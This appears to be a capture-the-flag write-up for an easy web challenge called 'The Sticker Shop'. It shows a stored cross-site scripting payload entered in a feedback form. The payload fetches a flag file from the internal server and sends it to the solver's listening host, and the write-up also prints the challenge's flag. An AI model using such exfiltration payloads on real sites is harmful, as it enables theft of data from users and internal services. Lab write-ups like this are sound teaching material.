# The Sticker Shop

## Challenge Information
- **Challenge Name**: The Sticker Shop
- **Category**: Web Exploitation
- **Difficulty Level**: Easy

## Initial Analysis
On getting the target ip, as a tradition, i first conducted nmap analysis in which i found 4 ope ports. One was the current 8080, one was 22 and the other 2 were behind the firewalls. Moreover, i also conducted a directory enumeration p but did not find anything. I also tried to conduct a detailed nmap search for the services or vulnerabilites, but no use. Since we knew that both the client and the server are running on the same machine, it means that the server can be accessible in our local machine.

## Exploitation Steps

1. There is a feedback form in which i tried to send a command to my server: 
```javascript
<script>
  fetch('http://<YOUR_VPN_IP>:3000/flag.txt')
</script>
```

2. Before this, I ran my server locally using python `python -m http.server 3000`. On entering the payload in the feedback form, i received a response of 404 not found for the flag file. It means that i can send requests to my sever using this textarea input.

3. So lets modify the payload in which i will try to fetch the flag file from the local running server and send it to my hosted server. The modified script will first fetch the flag file from the local server, if it successfully receives the flag file in the response, it will send it in the fetch request to my locally hosted server.
```javascript
<script>
  fetch('http://127.0.0.1:8080/flag.txt')
    .then(response => response.text())
    .then(data => {
      fetch('http://<YOUR_VPN_IP>:3000/?flag=' + data);
    });
</script>
```

4. On submitting this payload, i recieved a request on my server in which the conents of the flag were available `THM{83789a69074f636f64a38879cfcabe8b62305ee6}`.
